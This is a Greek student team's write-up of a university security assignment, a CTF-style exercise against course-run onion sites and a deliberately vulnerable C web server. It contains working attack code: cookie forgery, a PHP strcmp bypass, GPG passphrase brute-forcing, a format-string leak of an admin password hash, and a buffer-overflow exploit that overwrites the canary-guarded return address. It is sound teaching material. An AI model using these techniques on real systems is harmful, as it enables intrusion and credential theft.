# Όνομα ομάδας: hackerz - Εργασία 2
**Μέλη**:
 - Κώστας Χατζόπουλος - 1115201300202
 - Βασίλειος Πουλόπουλος - 1115201600141


## Ερώτημα 1 
Αρχικά, πλοηγηθήκαμε στο site ( http://2fvhjskjet3n5syd6yfg5lhvwcs62bojmthr35ko5bllr3iqdb4ctdyd.onion ) , στον κώδικα html και στα cookies. Τα 2 πράγματα που μας κίνησαν το ενδιαφέρον ήταν το σχόλιο στον κώδικα αλλά και το οτι μέσω του cookie μπορούσαμε να αλλάξουμε τον αριθμό των visitors.
### Για το σχόλιο
Μπήκαμε στο άρθρο που είχε το σχόλιο ( https://blog.0day.rocks/securing-a-web-hidden-service-89d935ba1c1d ) και δοκιμάζαμε ότι έλεγε μήπως βρίσκαμε κάτι που δεν είχε γίνει. Πράγματι το /server-info ( http://2fvhjskjet3n5syd6yfg5lhvwcs62bojmthr35ko5bllr3iqdb4ctdyd.onion/server-info ) δεν ήταν κλειδομένο και μπήκαμε να δούμε αν θα βρούμε πληροφορίες που μας ενδιαφέρουν. 

Βρήκαμε **(1)** πως υπάρχει και **προσωπικό site του ys13**  το οποίο βρισκόταν σε άλλο link ( http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/ ) το οποίο οδηγεί σε μία φόρμα εισόδου που ζητάει κωδικό και **(2)** πως επιτρέπεται η είσοδος σε αρχεία με κατάληξη .phps. 

### Για το cookie
Παρατηρήσαμε πως το cookie ηταν ένα string της μορφής base64(number:sha256(number)) οπότε βάζοντας στο number οτιδήποτε, μπορούσε να τυπωθεί στη σελίδα κάτω από το visitor number. Έτσι, φτιάξαμε ένα script (cookie.py) στο οποίο δίναμε την είσοδο που θέλαμε και υπολόγιζε το αντίστοιχο cookie.

**cookie.py:**
```python
from hashlib import sha256
from base64 import b64encode

print("Give input")
x = input()
y = sha256(x.encode())
y = y.hexdigest()
final = x+":"+y
encoded = b64encode(final.encode('ascii'))
print(encoded.decode('ascii'))
```

### Personal YS13 website
Μέσω του html κώδικα της φόρμας εισόδου, είδαμε ότι έκανε GET request στο access.php. 
Αφού επιτρέπεται η είσοδος στα .phps αρχεία δοκιμάσαμε να μπούμε στο /access.phps και τα καταφέραμε ( http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/access.phps ). Είχαμε πλέον πρόσβαση στον κώδικα της access.php. Tο περιεχόμενο της μεταβλητής **$desired** το υπολογίσαμε μέσω script που φτιάξαμε (desired.py)

**desired.py:**
```python
number = 7
p = 1
mult = 0
counter = 0
while  1:
    mult = p*number
    if (str(mult)).count('7') != 0: 
	    counter += 1    
	    print(str(counter) + ": " + str(mult))    
    if counter == 48:    
	    print(mult)    
	    break    
    p += 1
```

και μας έβγαλε τον αριθμό **1337**, αλλά έπρεπε το μέγεθος του **$desired** να είναι 7, οπότε βάλαμε για username τον αριθμό **0001337**, ο οποίος ήταν και ο σωστός. Για το password ψάξαμε αν μπορούμε να διαπεράσουμε την **strcmp** της php. Ψάχνοντας στο google, βρήκαμε αυτό το [άρθρο](https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016) . Στείλαμε το password σαν array και η strcmp μας γύρισε NULL αντί για error. Στην php ισχύει ότι NULL == 0, οπότε διαπεράσαμε τη συνθήκη της if. ( http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/access.php?user=0001337&password[]=%22%22 ). Φτάσαμε στο μήνυμα **"Hi! You can find my blog posts at directory: /blogposts7589109238!"**.  Μπήκαμε στα blog posts ( http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/blogposts7589109238 ) και κάναμε access τον φάκελο που περιέχει τα post ( http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/blogposts7589109238/blogposts/ ). 

Εκτός από τα posts (**diary.html**, **diary2.html**) βρήκαμε και το **post3.html**.  To διαβάσαμε και κρατήσαμε δύο πράγματα που φανταζόμασταν ότι θα μας ήταν χρήσιμα. Τη λέξη "**raccoon**" και την τελευταία πρόταση που έλεγε πως  τα backup θα τα βρεί ο #100013 χρήστης που θα μπει στο site. Έχοντας τη δυνατότητα να αλλάξουμε το visitor number, το αλλάξαμε σε 100013 και μας εμφάνισε το μήνυμα 

>  Visitor number
> Congrats user #100013! Check directory /sekritbackups2444 for latest
> news... 

Έτσι βρήκαμε τα backup files ( http://2fvhjskjet3n5syd6yfg5lhvwcs62bojmthr35ko5bllr3iqdb4ctdyd.onion/sekritbackups2444/ ). Στο αρχείο **notes.txt.truncated**, διαβάσαμε πως κάνει το encrypt για τα files του. Φανταζόμασταν πως το "raccoon" είναι το string που θέλαμε αλλά δεν ξέραμε την ημερομηνία. Έτσι φτιάξαμε ένα script (decrypt.py) το οποίο δοκίμαζε όλες τις ημερομηνίες του 2020 με τη λέξη "raccoon" και έτσι βρήκαμε τη σωστή ημερομηνία η οποία ήταν "**2020-2-12**". 


**decrypt.py:**
```python
import hashlib
import os

def encrypt_string(hash_string):
sha_signature = \
    hashlib.sha256(hash_string.encode()).hexdigest()
return sha_signature

for y in range(1, 12):
for i in range(1, 31):
    x = "2020-" + "{:02d}".format(y) + "-" + "{:02d}".format(i) + " raccoon"
    print(x)
    sha_signature = encrypt_string(x)
    cmd1 = 'echo ' + sha_signature + ' | gpg --batch --yes --passphrase-fd 0 /home/msi/Desktop/sekritbackups2444/firefox.log.gz.gpg'
    cmd2 = 'echo ' + sha_signature + ' | gpg --batch --yes --passphrase-fd 0 /home/msi/Desktop/sekritbackups2444/signal.log.gpg'
    print(cmd1)
    os.system(cmd1)
    os.system(cmd2)
```

Κάναμε decrypt τα αρχεία.

 Στο **firefox.log** τρέξαμε ένα bash script(remove.sh)

**remove.sh:**
```bash
grep -v "https://en.wikipedia.org/wiki/The_Conversation" firefox.log > out.txt
```

 για να φύγουν όλα τα link του wikipedia, οπότε μας έμεινε το link του github( https://github.com/asn-d6/tor/ ). Μπήκαμε και είδαμε το τελευταίο commit που είχε κάνει ο κύριος **George Kadianakis** . Το link ήταν το: [https://github.com/asn-d6/tor/commit/9892cc3b12db4dc1e8cbffec8e18bb18cbd77d0f](https://github.com/asn-d6/tor/commit/9892cc3b12db4dc1e8cbffec8e18bb18cbd77d0f) . 
Μετά μπήκαμε στο **signal.log** και πήραμε τον κωδικό και αντικαταστήσαμε τον κωδικό του τελευταίου commit στο παραπάνω url με αυτόν που πήραμε από το signal.log ( [https://github.com/asn-d6/tor/commit/2355437c5f30fd2390a314b7d52fb3d24583ef97](https://github.com/asn-d6/tor/commit/2355437c5f30fd2390a314b7d52fb3d24583ef97) ). Έτσι φτάσαμε στις οδηγίες για την εύρεση των συντεταγμένων όπου για < team name > βάλαμε το όνομα της ομάδας μας "hackerz". Ετσι βρήκαμε τις συντεταγμένες.   

Συντεταγμένες: **(47.5284864714, 4.8260977302)**


## Ερώρημα 2
Από το diary2.html ( http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/blogposts7589109238/blogposts/diary2.html ) κρατήσαμε 2 πράγματα. Το link του github με τον κώδικα του pico server ( https://github.com/chatziko/pico ) και το link για τον server( 4tpgiulwmoz4sphv.onion ). Στήσαμε τον server στα μηχανήματά μας ώστε να τον τεστάρουμε και για να δούμε τον κώδικα αναλυτικά. 

Αρχικά είδαμε το σχόλιο "TODO" και παρατηρήσαμε την vulnerable printf. τυπώσαμε addresses βάζοντας για input μερικά %08x και πράγματι μας τα τύπωνε. Στη συνέχεια βάλαμε %s στο τέλος των %08x. Αν υπήρχε κάποιο string εκεί θα τυπωνόταν, οπότε αρχίσαμε από την πρώτη διεύθυνση να προσπαθούμε να τυπώσουμε κάποιο string, αν δε βρίσκαμε κάτι, προσθέταμε ένα %08x πριν το %s ωστε να πάμε στην επόμενη διεύθυνση να τυπώσουμε το string. Αυτό το συνεχίσαμε μέχρι να βρούμε κάτι χρήσιμο. 

Φτιάξαμε ένα script που μας έφτιαχνε το input με όσα %08x θέλαμε και έτρεχε το δοκίμαζε(input.py).

**input.py:**
```python
import os

from base64 import b64encode    
x =  '%08x '    
baseInput =  "%08x "     

for i in  range(0, 5):    
    baseInput = baseInput + x    
baseInput +=  "%s:lalala"    
encoded = b64encode(baseInput.encode('ascii'))
print(baseInput)    
curl =  "curl -I 'http://127.0.0.1:8000/' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:77.0) Gecko/20100101 Firefox/77.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Authorization: Basic "  + encoded.decode('ascii') +"'"    
print(curl)    
os.system(curl)    
print('\n\n')
```    

Μετά από μερικές προσπάθειες βρήκαμε τα στοιχεία του πρώτου χρήστη (που ήταν της μορφής **name:md5(password)**) που βρίσκονταν στο αρχείο **passwd** . Μεταφέραμε ακριβώς το ίδιο input (**%08x %08x %08x %08x %08x %08x %s**) στο server της άσκησης και το output ήταν: 

> http://4tpgiulwmoz4sphv.onion is requesting your username and
> password. The site says: “Invalid user:  5807d010 15 5656951d ffffffff
> d00 5806d155 admin:f68762a532c15a8954be87b3d3fc3c31”


Άρα το md5 hash του κωδικου του admin είναι: **f68762a532c15a8954be87b3d3fc3c31** 
Ψάξαμε σε μερικά site το hash για να βρόυμε το password και μετά από μερικές προσπάθειες βρήκαμε ένα το οποίο μας έδωσε το password "you shall not pass" :D 
([https://md5.gromweb.com/?md5=f68762a532c15a8954be87b3d3fc3c31](https://md5.gromweb.com/?md5=f68762a532c15a8954be87b3d3fc3c31)). 
Όταν αποκτήσαμε πρόσβαση, η απάντηση βρισκόταν εκεί.
 
Για να ολοκληρωθεί το Plan X χρείάζεται ένας **ηλιακός  αναλυτής ανέμου**...

## Ερώρημα 3

Για να μάθουμε ποια ειναι τα results του "Plan Y" ακολουθήσαμε την παρακάτω διαδικασία:

Παρατηρήσαμε ότι το input που δίναμε το έπαιρνε  η συνάρτηση **memcpy** για να το αντιγράψει στον πίνακα **post_data** και για μήκος χρησιμοποιούσε τo μήκος του input + 1 (payload_size + 1). Οπότε αν δίναμε είσοδο πάνω από 100 χαρακτήρες η memcpy θα έκανε πάνω από 100 αντιγραφές με αποτέλεσμα να μπορούμε να κάνουμε buffer overflow.

Στη συνέχεια τρέξαμε τον server με gdb για δούμε την δομή της στοίβας στο frame της συνάρτησης **post_param**.

Είδαμε ότι μετά τα 100 στοιχεία του buffer ήταν το **canary**, δυο ίδιες διευθύνσεις σταθερές, o **saved $ebp** και o **saved $eip**. Σκοπός μας ήταν να αλλάξουμε τη διεύθυνση του saved $eip και να κάνουμε την συνάρτηση post_param να επιστρέψει μεσα στο if(allowed) και να κληθεί η **serve_ultimate()**. Εν τέλη αποφασίσαμε να κάνουμε την post_param να επιστρέψει μέσα στην serve_ultimate.

Για αρχή αλλάξαμε την τιμή του saved $eip από τον gdb, της δώσαμε την τιμή της διεύθυνσης εντολής **<serve_ultimate+18>** και πράγματι ο κώδικας συνέχισε να εκτελείται από την εκείνη την εντολή και μετά, δηλαδή μέσα στην συνάρτηση serve_ultimate με αποτέλεσμα να δούμε τα περιεχόμενα του αρχείου **ultimate.html**

Για να γίνει το attack έπρεπε να κάνουμε ένα buffer στο οποίο όλα τα στοιχεία μετά τον buffer θα παραμείνουν ίδια εκτός από τον saved $eip. Για αυτό το λόγο έπρεπε να ξέρουμε την τιμή του canary, του  saved $ebp και τις 2 ενδιάμεσες διευθύνσεις (που ήταν ίσες) που είχαμε παρατηρήσει ότι παραμένανε σταθερές. 

Χρησιμοποιήσαμε την vulnerable printf του ερωτήματος 2 και τυπώσαμε το frame της **check_auth**. 

Το saved $ebp είναι το ίδιο γιατί γυρνάνε στην ίδια συνάρτηση (route) και το Canary ειναι επίσης το ίδιο για όλες τις συναρτήσεις του προγράμματος. 

Παρατηρήσαμε επίσεις πως η μια από τις 2 ενδιάμεσες διευθύνσεις ήταν ίδια με τις 2 ενδιάμεσες διευθύνσεις του frame του post_param.

Στη συνέχεια τυπώσαμε το frame της check_auth + την επόμενη διεύθυνση (saved $eip) από τον remote server, οπότε είχαμε το canary, την αντίστοιχη διεύθυνση της σταθερής διεύθυνσης που θέλαμε, τον saved $ebp και τον saved $eip, βρήκαμε και τον αντίστοιχο local saved $eip και τον αφαιρέσαμε από τον saved $eip του remote server, έτσι είχαμε το offset ανάμεσα στον local server και στον remote server. Προσθέσαμε αυτό το offset στην διεύθυνση της εντολής **<serve_ultimate+18>** και βρήκαμε την διεύθυνσή της στο remote server. Τέλος σχεδιάσαμε το input, το οποίο ήταν της μορφής:

> 'Α' * 100 + Canary + Constant address * 2 + Saved $ebp + <serve_ultimate+18> address

Με αυτό το input, καταφέραμε να κάνουμε το exploit.

Για να κάνουμε τις δοκιμές στον remote server, τρέξαμε την εντολή socat:
```bash
socat TCP4-LISTEN:8000,bind=127.0.0.1,fork SOCKS4A:localhost:4tpgiulwmoz4sphv.onion:80,socksport=9150
```

εχοντας ανοικτό το tor service και στην συνέχεια εκτελέσαμε το script request.py για να κάνουμε το request.

**request.py:**
```python
import requests

headers = {
'U': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:77.0) Gecko/20100101 Firefox/77.0',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'Accept-Language': 'en-US,en;q=0.5',
'Content-Type': 'application/x-www-form-urlencoded',
'Origin': 'http://127.0.0.1:8000',
'Authorization': 'Basic YWRtaW46eW91IHNoYWxsIG5vdCBwYXNz',
'Connection': 'keep-alive',
'Referer': 'http://127.0.0.1:8000/',
'Upgrade-Insecure-Requests': '1',
}

#canary = i.to_bytes(4, byteorder='little')
data = b'A' * 100               # <-- buffer
data += b'\x00\xe2\x4c\xe7'     # <-- canary
data += b'\x00\x70\x5c\x56'     # <-- canary
data += b'\x00\x70\x5c\x56'     # <-- canary
data += b'\x78\x58\x8e\xff'     # <-- saved $ebp
data += b'\x6d\x49\x5c\x56'     # <-- saved $eip
try:
response = requests.post('http://127.0.0.1:8000/ultimate.html', headers=headers, data=data)
status_code = response.status_code
print("status_code = [" + str(status_code) + "]")
print("text = [" + response.text+ "]")
except requests.exceptions.RequestException as e:
print(e)
```
Response:

 > Results:
> 
> 41.99334111122333
> 
> Preliminary results, the answer is approximate. Our supercomputer is
> working on it but it's taking forever.
> 
> The log is here: /var/log/z.log



**debug.sh:**
```bash
#!/bin/sh
make

PID=ps -eaf | grep picoserver | grep -v grep | awk '{print $2}'

kill -9 $PID

gdb\
-ex 'b httpd.c:58'\
-ex 'b main.c:179'\
-ex 'b main.c:181'\
-ex 'b main.c:194'\
-ex 'b main.c:197'\
-ex 'r'\
-ex 'set follow-fork-mode child'\
-ex 'c'\
-ex 'x/39xw $sp'\
-ex 'x/a $ebp + 4'\
./picoserver
```

**Χρήσιμες εντολές gdb:**
Υπολογισμός του offset της διεύθυνσης του remote server σε σχέση με την διεύθυνση του local server:

    call fprintf(stderr, "%p\n", [remote address] - [local address])

Υπολογισμός του διεύθυνσης εντολής:

    call fprintf(stderr, "%p\n", [local address of command] + offset)

Επαλήθευση σωστής διεύθυνσης εντολής

    x/a 0x0040190a

Επανασύνδεση του gdb με την γονική διεργασία:

    attach [PID]
 
Υπολογισμός λέξεων που καταλαμβάνει το τρέχον frame:

    p ($ebp - $esp) / 4 // <-- 40
Εκτύπωση του τρέχον frame σε λέξεις:

    x/40xw $sp

Σημείωση: Τα python scripts είναι γραμμένα σε **python3**.
